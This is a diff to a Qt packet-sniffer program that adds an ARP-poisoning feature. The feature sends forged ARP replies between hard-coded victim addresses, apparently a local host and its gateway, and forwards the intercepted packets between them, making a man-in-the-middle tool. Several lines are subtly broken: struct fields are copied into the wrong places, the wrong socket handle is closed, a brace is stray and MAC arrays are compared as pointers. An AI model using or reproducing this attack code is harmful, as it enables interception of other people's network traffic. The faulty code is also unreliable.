@@ -11,6 +11,9 @@ MainWindow::MainWindow(QWidget *parent) :
     ui->setupUi(this);
     ui->pb_scroll->setCheckable(true);
     ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
+    client1 = NULL;
+    client2 = NULL;
+    counter = 0;
 
     thread = new QThread();
     sniffer = new Sniffer();
@@ -26,6 +29,10 @@ MainWindow::MainWindow(QWidget *parent) :
     connect(ui->pb_clear, SIGNAL(clicked()), this, SLOT(Clear()));
     connect(ui->pb_load, SIGNAL(clicked()), this, SLOT(Load()));
     connect(ui->pb_save, SIGNAL(clicked()), this, SLOT(Save()));
+
+#ifdef __linux__
+    connect(ui->pb_arp, SIGNAL(clicked()), this, SLOT(ArpPoisoning()));
+#endif
 }
 
 MainWindow::~MainWindow()
@@ -49,10 +56,19 @@ void    MainWindow::Clear()
 
 void    MainWindow::getNewPackets()
 {
+    if (counter++ == 20)
+    {
+        counter = 0;
+        this->refreshArp();
+    }
+
     sniffer->mutex.lock();
 
     for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
+    {
+        checkArp(*(*it));
         insertPacket(*(*it));
+    }
 
     sniffer->Packets.clear();
     if (ui->pb_scroll->isChecked())
@@ -86,6 +102,7 @@ void    MainWindow::insertToIndex(const QString &str, int row, int col)
 
 void                MainWindow::StartSniffing(const std::string &interface)
 {
+    this->interface = interface;
     sniffer->Initialize(interface);
     thread->start();
     ui->pb_sniff->setText("STOP");
@@ -103,6 +120,12 @@ void                MainWindow::ToggleSniffer()
         }
         this->sniffer->DeInitialize();
         ui->pb_sniff->setText("START");
+        if (client1 != NULL)
+        {
+            delete client1;
+            delete client2;
+            client1 = NULL;
+        }
 
         return ;
     }
@@ -205,4 +228,124 @@ void                  MainWindow::Load()
   }
   else
       qDebug() << "Unable to open file";
+}
+
+void                MainWindow::ArpPoisoning()
+{
+    mac[0] = 0x60;
+    mac[1] = 0x67;
+    mac[2] = 0x20;
+    mac[3] = 0x1A;
+    mac[4] = 0xA2;
+    mac[5] = 0xFC;
+
+    client_t    *client = new client_t;
+    client->ip = "192.168.43.32";
+    client->mac[0] = 0x60;
+    client->mac[1] = 0x67;
+    client->mac[2] = 0x20;
+    client->mac[3] = 0x1A;
+    client->mac[4] = 0xC7;
+    client->mac[5] = 0xD0;
+    client1 = client;
+
+    client = new client_t;
+    client->ip = "192.168.43.1";
+    client->mac[0] = 0x98;
+    client->mac[1] = 0x0C;
+    client->mac[2] = 0x82;
+    client->mac[3] = 0xB0;
+    client->mac[4] = 0xD7;
+    client->mac[5] = 0x68;
+    client2 = client;
+}
+
+void            MainWindow::refreshArp()
+{
+#ifdef __linux__
+    if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
+        return;
+
+    int                 sock;
+    char                packet[PKTLEN];
+    struct ether_header *eth = (struct ether_header *) packet;
+    struct ether_arp    *arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
+    struct sockaddr_ll  device;
+
+    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (sock < 0)
+        qDebug() << "fail socket";
+
+    client_t    *client = client1;
+    for (int i = 0; i < 2; ++i)
+    {
+        // From
+        std::memcpy(arp->arp_tha, client, 6);
+        // To
+        std::memcpy(arp ->arp_spa, client == client1 ? client2 : client1, strlen(client == client1 ? client2->ip : client1->ip));
+        // By
+        std::memcpy(arp->arp_sha, mac, 6);
+
+        memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
+        memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
+        eth->ether_type = htons(ETH_P_ARP);
+
+        arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+        arp->ea_hdr.ar_pro = htons(ETH_P_IP);
+        arp->ea_hdr.ar_hln = ETH_ALEN;
+        arp->ea_hdr.ar_pln = IP4LEN;
+        arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
+
+        memset(&device, 0, sizeof(device));
+        device.sll_ifindex = if_nametoindex(this->interface);
+        device.sll_family = AF_PACKET;
+        memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
+        device.sll_halen = htons(ETH_ALEN);
+
+        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
+    }
+
+    closesocket(socket);
+    }
+#endif
+}
+
+void    MainWindow::checkArp(SniffedPacket &packet)
+{
+    if (client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
+        return;
+
+    eth_hdr_t *eth = packet.data;
+    if (eth->ether_dhost != mac)
+        return;
+
+    if (!(client1->ip == packet.ip_source && client2->ip == packet.ip_dest) &&
+            !(client2->ip == packet.ip_source && client1->ip == packet.ip_dest))
+        return;
+
+    int                  sd;
+    struct sockaddr_in   sin;
+    int                  one = 1;
+    const int            *val = &one;
+
+    sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
+    if(sd < 0)
+        return;
+
+    IP_HDR  *ip = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = 0;
+    sin.sin_addr.s_addr = ip->ip_srcaddr;
+
+    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one)) < 0)
+        return;
+
+ #ifdef _WIN32
+    sendto(sd, packet.data, packet.size, 0, (struct sockaddr *)&sin, sizeof(sin));
+    closesocket(sd);
+ #elif __linux__
+    sendto(sd, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
+    close(sd);
+ #endif
 }
